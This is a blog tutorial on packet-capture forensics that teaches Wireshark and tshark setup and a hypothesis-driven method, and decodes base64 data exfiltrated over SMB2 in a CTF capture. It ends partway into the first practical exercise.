<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>PCAP analysis : How to basic - Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)</title><meta name=Description content="How to basic on Wireshark usage."><meta property="og:title" content="PCAP analysis : How to basic"><meta property="og:description" content="How to basic on Wireshark usage."><meta property="og:type" content="article"><meta property="og:url" content="maki.bzh/shorts/wiresharkhowtobasics/"><meta property="og:image" content="/maki.bzh/shorts/wiresharkhowtobasics/featured-image.png"><meta property="article:section" content="shorts"><meta property="article:published_time" content="2019-02-20T21:57:40+08:00"><meta property="article:modified_time" content="2019-02-20T21:57:40+08:00"><meta property="og:site_name" content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/maki.bzh/shorts/wiresharkhowtobasics/featured-image.png"><meta name=twitter:title content="PCAP analysis : How to basic"><meta name=twitter:description content="How to basic on Wireshark usage."><meta name=application-name content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=apple-mobile-web-app-title content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=maki.bzh/shorts/wiresharkhowtobasics/><link rel=prev href=maki.bzh/shorts/dontpayvps/><link rel=next href=maki.bzh/shorts/rtcpssl/><link rel=stylesheet href=/maki.bzh/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"PCAP analysis : How to basic","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"maki.bzh\/shorts\/wiresharkhowtobasics\/"},"image":[{"@type":"ImageObject","url":"\/maki.bzh\/shorts\/wiresharkhowtobasics\/featured-image.png","width":512,"height":304}],"genre":"shorts","keywords":"methodology, wireshark, pcap, malware, forensic, blue team","wordcount":5362,"url":"maki.bzh\/shorts\/wiresharkhowtobasics\/","datePublished":"2019-02-20T21:57:40+08:00","dateModified":"2019-02-20T21:57:40+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"\/lib\/images\/avatar.png"},"author":{"@type":"Person","name":"Maki"},"description":"How to basic on Wireshark usage."}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/maki.bzh/posts/>Posts </a><a class=menu-item href=/maki.bzh/shorts/>Shorts </a><a class=menu-item href=/maki.bzh/offers/>Offers </a><a class=menu-item href=/maki.bzh/writeups/>Writeups </a><a class=menu-item href=/maki.bzh/tags/>Tags </a><a class=menu-item href=/maki.bzh/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/maki.bzh/posts/ title>Posts</a><a class=menu-item href=/maki.bzh/shorts/ title>Shorts</a><a class=menu-item href=/maki.bzh/offers/ title>Offers</a><a class=menu-item href=/maki.bzh/writeups/ title>Writeups</a><a class=menu-item href=/maki.bzh/tags/ title>Tags</a><a class=menu-item href=/maki.bzh/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">PCAP analysis : How to basic</h1><div class=content id=content><h1 id=introduction>Introduction</h1><p>Whether in &ldquo;Capture The Flag&rdquo; (CTF) events or even in professional life, we work with network captures. PCAP (Packet capture), is rich in information. It&rsquo;s easy to get lost in the amount of information and start on wrong tracks.
Throughout this MOOC, I will introduce you the methodology to be adopted to deal with this type of situation. Firstly, I will try to describe the PCAP content, list some tools and finally practical exercises resulting from CTF tests or malicious traffic.</p><h1 id=what-is-a-pcap-file>What is a PCAP file?</h1><p>PCAP means &ldquo;Packet Capture&rdquo;, as its name says, this kind of file contains complete packet going through a network interface. Complete packet means that PCAP files will contain data from second to the seventh layer of the OSI model.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/KRvb6OZ.png data-srcset="https://i.imgur.com/KRvb6OZ.png, https://i.imgur.com/KRvb6OZ.png 1.5x, https://i.imgur.com/KRvb6OZ.png 2x" data-sizes=auto alt=https://i.imgur.com/KRvb6OZ.png title=https://i.imgur.com/KRvb6OZ.png></p><h2 id=what-are-they-used-for>What are they used for?</h2><p>As we have just seen in Figure 1, a PCAP contains all information in a packet. It can, therefore, be used to identify malicious traffic (attacker, malware&mldr;), track a threat, identifies rogue DHCP servers, monitors intrusions, or simply for research purposes&mldr;</p><h2 id=who-is-using-pcap>Who is using PCAP?</h2><p>A whole bunch of people: researchers, system administrators, malware hunters or analysts during for incident response.</p><h1 id=tools>Tools</h1><p>Every analyst needs a well-stocked toolbox and he needs to know well its tools. Here are the main tools I use when I have to analyze PCAP file:</p><ul><li>Wireshark-qt / tshark</li><li>CapAnalysis</li><li>Binwalk / Foremost</li><li>Scripting languages (ex: Python / Bash)</li><li>Patience and coffee</li></ul><h2 id=wireshark--tshark>Wireshark / tshark</h2><p>Wireshark is a tshark-based analysis and capture tool, so I&rsquo;m talking about both in the same category. Wireshark provides a fairly graphical overview with intuitive filters. Here is an image of Wireshark in use:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/ErHl5bT.png data-srcset="https://i.imgur.com/ErHl5bT.png, https://i.imgur.com/ErHl5bT.png 1.5x, https://i.imgur.com/ErHl5bT.png 2x" data-sizes=auto alt=https://i.imgur.com/ErHl5bT.png title=https://i.imgur.com/ErHl5bT.png></p><p>tshark is a tool used to dump and analyze network information. It is possible to select a particular protocol, IP address or other useful information like Wireshark. The main advantage of tshark on Wireshark, is data extraction.
The use of this tool may seem obscure, but here is its syntax:</p><blockquote><p>tshark -r filename.pcap -Y display_filter -Tfields -e some_specific_filter</p></blockquote><ul><li><strong>filename.pcap</strong>: PCAP file to analyze ;</li><li><strong>display_filter</strong>: This parameter will take the wireshark display filter as an argument ;</li><li><strong>some_specific_filter</strong>: This will be used to extract a specific data.</li></ul><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/2PdDYlr.png data-srcset="https://i.imgur.com/2PdDYlr.png, https://i.imgur.com/2PdDYlr.png 1.5x, https://i.imgur.com/2PdDYlr.png 2x" data-sizes=auto alt=https://i.imgur.com/2PdDYlr.png title=https://i.imgur.com/2PdDYlr.png></p><p>This PCAP comes from a CTF challenge. Complete writeup can be found on Ressource 3.</p><h2 id=capanalysis>CapAnalysis</h2><p>CapAnalysis will be used to perform a statistical analysis of PCAP file, such as counting the number of requests per IP, the list of protocols used over time and many others. It provides a good overview of PCAP file before starting the analysis.
A docker is available on Docker Hub (see Resources 4).</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/nhzWXQe.png data-srcset="https://i.imgur.com/nhzWXQe.png, https://i.imgur.com/nhzWXQe.png 1.5x, https://i.imgur.com/nhzWXQe.png 2x" data-sizes=auto alt=https://i.imgur.com/nhzWXQe.png title=https://i.imgur.com/nhzWXQe.png></p><h2 id=binwalk--foremost>Binwalk / Foremost</h2><p>Binwalk is a fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images. It will detect some file pattern inside another. For example, a packet capture during PNG file transfer:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/JrElXCJ.png data-srcset="https://i.imgur.com/JrElXCJ.png, https://i.imgur.com/JrElXCJ.png 1.5x, https://i.imgur.com/JrElXCJ.png 2x" data-sizes=auto alt=https://i.imgur.com/JrElXCJ.png title=https://i.imgur.com/JrElXCJ.png></p><p>Foremost is similar to Binwalk.</p><h2 id=scripting-languages>Scripting languages</h2><p>Python and bash are often used because they are really user friendly and there are lot of libraries.</p><p>For Python:</p><ul><li>PyShark</li><li>Scapy</li></ul><p>For Bash:</p><ul><li>grep</li><li>strings</li><li>tr</li><li>xxd</li></ul><h2 id=tsurugi-linux>TSURUGI Linux</h2><p>The Linux distribution TSURUGI has been developed for forensic analysts in order to make a turnkey OS with all the essential pre-configured tools. The tools mentioned above are all installed in this distribution, even more.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://pbs.twimg.com/media/Ds2ae-2XgAA3rip.jpg data-srcset="https://pbs.twimg.com/media/Ds2ae-2XgAA3rip.jpg, https://pbs.twimg.com/media/Ds2ae-2XgAA3rip.jpg 1.5x, https://pbs.twimg.com/media/Ds2ae-2XgAA3rip.jpg 2x" data-sizes=auto alt=https://pbs.twimg.com/media/Ds2ae-2XgAA3rip.jpg title=https://pbs.twimg.com/media/Ds2ae-2XgAA3rip.jpg></p><table><thead><tr><th>Filename</th><th>SHA1</th><th>Download link</th></tr></thead><tbody><tr><td>tsurugi_lab_2018.1.iso</td><td>b54895db6fba93239b668edb9f5ef02bef975b40</td><td><a href=https://tsurugi-linux.org/downloads.php target=_blank rel="noopener noreffer">https://tsurugi-linux.org/downloads.php</a></td></tr></tbody></table><h1 id=pimp-my-wireshark>Pimp my Wireshark</h1><p>Before starting the analysis, it is important to correctly configure your tools. <strong>Wireshark</strong> will probably be the most frequently used tool in analysis. An important point to add is that the configuration I will present is my own, it is up to you to make your own. I am open to your changes and would be happy to discuss about them.</p><h2 id=column-changes>Column changes</h2><p>By default, the configuration of this tool is acceptable. We will add the following columns to make our <strong>Wireshark</strong> displaying more relevant results:</p><ul><li>Packet source port</li><li>Packet destination port</li><li>Hostname</li><li>Change date format</li><li>Display transferred data in hex</li></ul><p>The first column, containing the packet numbers, will be deleted. Indeed, it is possible to order the packages over time, which is more relevant, in my opinion. To modify a column in Wireshark, simply go to the <strong>Columns</strong> menu at the path:</p><blockquote><p>Edit -> Preferences -> Columns</p></blockquote><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/sv4qYcy.gif data-srcset="https://i.imgur.com/sv4qYcy.gif, https://i.imgur.com/sv4qYcy.gif 1.5x, https://i.imgur.com/sv4qYcy.gif 2x" data-sizes=auto alt=https://i.imgur.com/sv4qYcy.gif title=https://i.imgur.com/sv4qYcy.gif></p><p>In a first time, we have to delete the number column:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/m7z4eTe.png data-srcset="https://i.imgur.com/m7z4eTe.png, https://i.imgur.com/m7z4eTe.png 1.5x, https://i.imgur.com/m7z4eTe.png 2x" data-sizes=auto alt=https://i.imgur.com/m7z4eTe.png title=https://i.imgur.com/m7z4eTe.png></p><ol><li>Add a column</li><li>Select the filter <strong>Src port (unresolved)</strong> and <strong>Dst port (unresolved)</strong></li><li>You can move the column where you want. <strong>Don&rsquo;t let a column behind the &lsquo;Info&rsquo; one, otherwise the column won&rsquo;t be displayed.</strong></li></ol><p>Another important point to notice, the packet timestamp. Originally, Wireshark does not display it following ISO 8601 standard. You can change it:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/RwEYnmH.gif data-srcset="https://i.imgur.com/RwEYnmH.gif, https://i.imgur.com/RwEYnmH.gif 1.5x, https://i.imgur.com/RwEYnmH.gif 2x" data-sizes=auto alt=https://i.imgur.com/RwEYnmH.gif title=https://i.imgur.com/RwEYnmH.gif></p><p>One of the protocols that are recurrent in a PCAP is the <code>HTTP</code> protocol. This protocol appears frequently because any user will generate this kind of traffic while browsing the Internet, applications, and software also use it for multiple reasons, etc&mldr;.
In a CTF, challenges contain unnecessary requests, in order to parasitize the PCAP traffic and try to drown the challenger under the amount of information. For malware, it may be interesting to retrieve communications with its command and control server, because it can receive orders, download other malware&mldr;</p><p>To have a PCAP file containing HTTP traffic, just open Wireshark and start capturing on a network interface with an Internet access.
With the following request in a terminal, it&rsquo;s enough to generate HTTP traffic:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl https://www.google.com/
</span></span></code></pre></td></tr></table></div></div><p>Now, it could be really nice to get hostname corresponding to IP address:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/q7ZAyNp.gif data-srcset="https://i.imgur.com/q7ZAyNp.gif, https://i.imgur.com/q7ZAyNp.gif 1.5x, https://i.imgur.com/q7ZAyNp.gif 2x" data-sizes=auto alt=https://i.imgur.com/q7ZAyNp.gif title=https://i.imgur.com/q7ZAyNp.gif></p><p>Just right clicking on the desired data and apply it as a column. This method can be applied to anything you want, knowing that adding and deleting a column is very easy, so don&rsquo;t hesitate to modify <strong>Wireshark</strong> according to your investigation.</p><p>Another column to be added, which may be interesting in some cases, will be the data that are passing through the network. It is possible to add a new column with the filter <strong>data.data</strong>, via the <strong>custom</strong> menu. To generate some traffic, you can use <strong>netcat</strong>:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/f7IXtx7.gif data-srcset="https://i.imgur.com/f7IXtx7.gif, https://i.imgur.com/f7IXtx7.gif 1.5x, https://i.imgur.com/f7IXtx7.gif 2x" data-sizes=auto alt=https://i.imgur.com/f7IXtx7.gif title=https://i.imgur.com/f7IXtx7.gif></p><h2 id=plugins>Plugins</h2><p>It is possible to develop and create Lua plugins for Wireshark. The Pentest Academy team has developed some interesting plugins (see Resource 5) to see domain names, DHCP connections or GET and POST request information. The installation is quite simple, just clone the repository and place the plugins in the right folder:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/GJ2zSeu.png data-srcset="https://i.imgur.com/GJ2zSeu.png, https://i.imgur.com/GJ2zSeu.png 1.5x, https://i.imgur.com/GJ2zSeu.png 2x" data-sizes=auto alt=https://i.imgur.com/GJ2zSeu.png title=https://i.imgur.com/GJ2zSeu.png></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ git clone https://github.com/pentesteracademy/patoolkit.git
</span></span><span class=line><span class=cl>$ cp -r patoolkit/plugins/* /home/maki/.local/lib/wireshark/plugins/
</span></span></code></pre></td></tr></table></div></div><p>So we have access to the Pentester Academy plugins. If either of you do, I&rsquo;ll be curious to know! :)</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/EW7kz2n.gif data-srcset="https://i.imgur.com/EW7kz2n.gif, https://i.imgur.com/EW7kz2n.gif 1.5x, https://i.imgur.com/EW7kz2n.gif 2x" data-sizes=auto alt=https://i.imgur.com/EW7kz2n.gif title=https://i.imgur.com/EW7kz2n.gif></p><h1 id=methodology>Methodology</h1><h2 id=introduction-1>Introduction</h2><p>A full packet network capture is a slow and heavy process, which is why it is rarely seen in an enterprise information system. To be aware of the noise generated by a networked device, try putting Wireshark in capture mode on your ethernet or wifi interface. All operating systems are sending ICMP or ARP requests to ensure that the equipment is properly connected. There are more specific things like the broadcast of a Windows system on the network.
That&rsquo;s why we spent a little time earlier to configure our tools correctly. It is extremely easy to get lost among all these logs and forget what you were looking for at the beginning.</p><p>In this part of the course, I will share my methodology when analyzing a PCAP file. This methodology is divided into four main areas:</p><ol><li>Overview&static analysis</li><li>Hypothesis</li><li>Checking</li><li>Find the treasure</li></ol><p>The aim is starting from a &ldquo;high level&rdquo; analysis, to establish hypotheses, verify them and establish others from the results obtained. And do not forget what we are looking for at the beginning: the treasure!</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/xT1XGzAnABSXy8DPCU/giphy.gif data-srcset="https://media.giphy.com/media/xT1XGzAnABSXy8DPCU/giphy.gif, https://media.giphy.com/media/xT1XGzAnABSXy8DPCU/giphy.gif 1.5x, https://media.giphy.com/media/xT1XGzAnABSXy8DPCU/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/xT1XGzAnABSXy8DPCU/giphy.gif title=https://media.giphy.com/media/xT1XGzAnABSXy8DPCU/giphy.gif></p><h2 id=overview--static-analysis>Overview & static analysis</h2><p>Throughout this course, I will analyze the same PCAP file as the one used in the prerequisites:</p><table><thead><tr><th>Filename</th><th>MD5</th><th>Download link</th></tr></thead><tbody><tr><td>OtterLeak.pcap</td><td>d0ab559c54fffe713fd13e9b0f7174df</td><td><a href=https://mega.nz/#!2DwzBaaR!VcTfsZadubKUTNn2LwPXQXoZ2sxpbxHt65B-Wj1N-so target=_blank rel="noopener noreffer">https://mega.nz/#!2DwzBaaR!VcTfsZadubKUTNn2LwPXQXoZ2sxpbxHt65B-Wj1N-so</a></td></tr></tbody></table><p>First of all, it is advisable to do a static analysis of the PCAP file. As presented in the previous parts, I use the CapAnalysis tool. The goal here will be to determine the interesting artifacts and build our hypotheses. It may be interesting to start with the following points:</p><ul><li>Protocol used</li><li>Amount of data sent</li><li>Source and destination IP</li><li>Geolocation</li><li>Filtering on time</li></ul><h3 id=state-of-the-art>State of the art</h3><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/6VLrd2d.png data-srcset="https://i.imgur.com/6VLrd2d.png, https://i.imgur.com/6VLrd2d.png 1.5x, https://i.imgur.com/6VLrd2d.png 2x" data-sizes=auto alt=https://i.imgur.com/6VLrd2d.png title=https://i.imgur.com/6VLrd2d.png></p><p>In the Figure above, we can see the SMB and HTTP protocols are much more used than the others. We can try to filter through these protocols to see what comes out of them:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/gbf3Pes.gif data-srcset="https://i.imgur.com/gbf3Pes.gif, https://i.imgur.com/gbf3Pes.gif 1.5x, https://i.imgur.com/gbf3Pes.gif 2x" data-sizes=auto alt=https://i.imgur.com/gbf3Pes.gif title=https://i.imgur.com/gbf3Pes.gif></p><p>By filtering on the protocols, we can see that the two most talkative IPs are these two internal IPs:</p><ul><li>Source IP: 10.0.0.6</li><li>Destination IP: 10.0.0.33</li></ul><p>Let&rsquo;s try to find something else on these IPs. By searching a little bit in the CapAnalysis menus, we can notice some interesting data:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/2KuAXaj.png data-srcset="https://i.imgur.com/2KuAXaj.png, https://i.imgur.com/2KuAXaj.png 1.5x, https://i.imgur.com/2KuAXaj.png 2x" data-sizes=auto alt=https://i.imgur.com/2KuAXaj.png title=https://i.imgur.com/2KuAXaj.png></p><p>Thanks to Figure 3, we can see that IPs <strong>10.0.0.6</strong> and <strong>10.0.0.33</strong> are the ones that <em>communicate most with each other</em>. In addition, we were able to learn that IP 10.0.0.33 has a domain name: <strong>Pika.local</strong>.</p><p>We are reaching a point where we will have to start writing hypotheses and test them for the future.</p><h2 id=hypothesis>Hypothesis</h2><p>With the information retrieved from the static analysis, we are able to identify the first hypotheses. Personally, I prefer to write them on a board or use paper and pencil to keep them in front of me. There is nothing worse in forensic than losing sight of what you are looking for.</p><p>In my opinion, at this stage, it&rsquo;s better to be fairly generalist at first and then to refine more and more. There will be what can be called &ldquo;feedback loops&rdquo;. It just means knowing when to step back from the situation when you fall into a deadlock. The methodology can be summarized in the following diagram:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/6rn6Sh6.png data-srcset="https://i.imgur.com/6rn6Sh6.png, https://i.imgur.com/6rn6Sh6.png 1.5x, https://i.imgur.com/6rn6Sh6.png 2x" data-sizes=auto alt=https://i.imgur.com/6rn6Sh6.png title=https://i.imgur.com/6rn6Sh6.png></p><p>By listing the information in our possession:</p><ul><li>IPs<ul><li>10.0.0.33 -> Pika.local</li><li>10.0.0.6</li></ul></li><li>Protocols<ul><li>SMB</li><li>HTTP</li></ul></li></ul><p>By limiting to this information, we are already making a huge filter on the entire PCAP file. It is important to keep in mind that the treasure we are looking for, may not be in there.</p><p>But knowing that, you can imagine some things:</p><ol><li>Data extraction via HTTP? SMB?</li><li>Communications to a command and control server?</li><li>Open SMB shares with open access data (anonymous user)?</li><li>An attack on the SMB, such as EternalBlue?</li><li>A vulnerable web application?</li></ol><p>These are examples, the aim is to identify as many hypotheses as possible in order to try to be as exhaustive as possible and then not miss something. Once the static analysis and the first hypotheses are completed, it is time to open <strong>Wireshark</strong> for a more in-depth analysis.</p><h2 id=checking>Checking</h2><p>What I called &ldquo;Checking part&rdquo; is the validation or not of the previous hypotheses. This verification will mostly be done via Wireshark and tshark. What you have to force yourself to do throughout the analysis is to continue to identify hypotheses and record them.</p><p>The hypotheses generated during the static analysis of the PCAP file only give a global idea, an axis of exploration to avoid getting lost in this sea of data. Network information is important, it will serve as an indicator of compromise (IOC). These indicators allow CERTs and other analysts to determine malicious behavior. Malware often uses particular patterns: an exotic user-agent, a C&C IP&mldr;</p><p>With this information, analysts can create rules for SIEM / IDS / IPS and other network analysis equipment. These rules will be used to identify malicious behavior quickly. An IOC can be:</p><ul><li>IP</li><li>User-Agent</li><li>Host</li><li>Specific pattern</li></ul><h3 id=round-1>Round 1</h3><p>With the information retrieved during the static analysis, let&rsquo;s try to build a filter:</p><ul><li>IPs filtering</li><li>Protocol filtering</li></ul><p>It gives us:</p><blockquote><p>((smb2 || http) || (ip.addr == 10.0.0.33)) && (ip.addr == 10.0.0.6)</p></blockquote><p>Once this filter is applied, something comes up:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/QNWp36i.gif data-srcset="https://i.imgur.com/QNWp36i.gif, https://i.imgur.com/QNWp36i.gif 1.5x, https://i.imgur.com/QNWp36i.gif 2x" data-sizes=auto alt=https://i.imgur.com/QNWp36i.gif title=https://i.imgur.com/QNWp36i.gif></p><p>Now we strongly assume that there is data exfiltration via SMB2. It is important to step back from the analysis, so there are other questions to ask:</p><ul><li>Who or what is responsible for this behavior?</li><li>Is the exfiltered data encrypted? Encoded?</li></ul><p>At this point, it comes back to what I said at the beginning of this MOOC: make other hypotheses and verify them, repeat the operation as long as necessary in order to find something interesting.</p><h3 id=round-2>Round 2</h3><p>If we look closely, the exfiltered bytes are sent only from IP 10.0.0.33 on port 445 to 10.0.0.6 on port 139. It is possible to refine our Wireshark filter a little:</p><blockquote><p>(ip.src == 10.0.0.33) && (ip.dst == 10.0.0.6) && smb2 && data.data</p></blockquote><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/yijCLe4.png data-srcset="https://i.imgur.com/yijCLe4.png, https://i.imgur.com/yijCLe4.png 1.5x, https://i.imgur.com/yijCLe4.png 2x" data-sizes=auto alt=https://i.imgur.com/yijCLe4.png title=https://i.imgur.com/yijCLe4.png></p><p>The data looks to a very particular encoding system, base64:</p><ul><li>Alpha chars, upper and lowercase</li><li>Digital chars</li><li>Terminated by an equal</li></ul><p>To be sure of that, <strong>tshark</strong> will be more useful than <strong>Wireshark</strong>:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/KCxyP74.gif data-srcset="https://i.imgur.com/KCxyP74.gif, https://i.imgur.com/KCxyP74.gif 1.5x, https://i.imgur.com/KCxyP74.gif 2x" data-sizes=auto alt=https://i.imgur.com/KCxyP74.gif title=https://i.imgur.com/KCxyP74.gif></p><p>The final command at the end of the GIF above is:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ tshark -r OtterLeak.pcap -Y <span class=s1>&#39;(ip.src == 10.0.0.33) &amp;&amp; (ip.dst == 10.0.0.6) &amp;&amp; smb2 &amp;&amp; data.data&#39;</span> -Tfields -e data.data <span class=p>|</span> tr -d <span class=s1>&#39;\n&#39;</span> <span class=p>|</span> xxd -r -p <span class=p>|</span> rev <span class=p>|</span> base64 -d
</span></span></code></pre></td></tr></table></div></div><ul><li><strong>tshark</strong>: This command will extract all data transferred from 10.0.0.33 to 10.0.0.6 through SMB2 in the PCAP ;</li><li><strong>tr</strong>: This command will remove all line return in the bash output ;</li><li><strong>xxd</strong>: This command will convert hex digit into ascii chars ;</li><li><strong>rev</strong>: This command will reverse the string</li><li><strong>base64</strong>: This command will decode the base64 data</li></ul><h2 id=find-the-treasure>Find the treasure</h2><p>After a while, we will find interesting things about the malicious actions carried out. However, analysts are fighting another scourge: <strong>time</strong>. The feeling of missing something can be really frustrating.</p><p>In a global attack like <strong>Wannacry</strong>, the real threat was time. The more analysts tried to be exhaustive, the more malware grew. The goal is to find important information quickly to stop the attack, while the security patches are put in place.
This is why the first step, during static analysis, is important. This step can be decisive for the future.</p><p>During the checking phase, if there is no relevant information, do not hesitate to restart from the beginning and repeat the procedure, in order to find more hypothesis.</p><p>Concerning this first part related to methodology, it is over. The methodology is relatively simple and is done naturally. The rather complicated points are: <strong>force yourself to find hypotheses</strong> before starting the analysis head down and <strong>take a step back</strong> on the investigation.</p><p>Another blocking point during the analysis will be the knowledge of the tools, including <code>Wireshark</code>. The following sections will be based on the use of tools and small tips and tricks to quickly extract the useful data.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/lD76yTC5zxZPG/giphy.gif data-srcset="https://media.giphy.com/media/lD76yTC5zxZPG/giphy.gif, https://media.giphy.com/media/lD76yTC5zxZPG/giphy.gif 1.5x, https://media.giphy.com/media/lD76yTC5zxZPG/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/lD76yTC5zxZPG/giphy.gif title=https://media.giphy.com/media/lD76yTC5zxZPG/giphy.gif></p><hr><h1 id=practical-example>Practical example</h1><h2 id=clear-tcp>Clear TCP</h2><p>This practical work will aim to familiarize students with network tools and protocols. I chose to do these exercises as a &ldquo;challenge&rdquo; as in CTF. The purpose of each TP is to find a character string, a &ldquo;flag&rdquo;. The format is <strong>flag{ImTheFlag}</strong>.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/l0HU1Ajixx0bg86oU/giphy.gif data-srcset="https://media.giphy.com/media/l0HU1Ajixx0bg86oU/giphy.gif, https://media.giphy.com/media/l0HU1Ajixx0bg86oU/giphy.gif 1.5x, https://media.giphy.com/media/l0HU1Ajixx0bg86oU/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/l0HU1Ajixx0bg86oU/giphy.gif title=https://media.giphy.com/media/l0HU1Ajixx0bg86oU/giphy.gif></p><p>In this first TP, we will see a TCP communication without a cryptographic layer. Many protocols rely on TCP to operate. However, most of them are not encrypted by default, here is a non-exhaustive list:</p><ul><li>Telnet</li><li>HTTP</li><li>SMTP</li><li>&mldr;</li></ul><h3 id=statement>Statement</h3><p>The exercise material can be found on the following link:</p><table><thead><tr><th>Filename</th><th>Hash</th><th>Download link</th></tr></thead><tbody><tr><td>cleartcp.pcapng</td><td>09a6f779bfe37db11a83b60dc8484111</td><td><a href=https://mega.nz/#!Ka4SAQYY!ky618XDVfmGMk0WNU46fprwlkgb8JJlG4BEd38QsEyA target=_blank rel="noopener noreffer">https://mega.nz/#!Ka4SAQYY!ky618XDVfmGMk0WNU46fprwlkgb8JJlG4BEd38QsEyA</a></td></tr></tbody></table><p>The goal here will be to find the content of the message sent by <strong>netcat</strong>. To do the manipulation again on your side, I invite you to read the following section, concerning the resolution.</p><h3 id=resolution>Resolution</h3><p>In this first practical exercise, it&rsquo;s not necessary to use CapAnalysis, because the PCAP file is ridiculously small. A simple quick view with Wireshark will be enough. Normally, if you have followed the previous chapters, something must be obvious to you:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/JINQ0MV.png 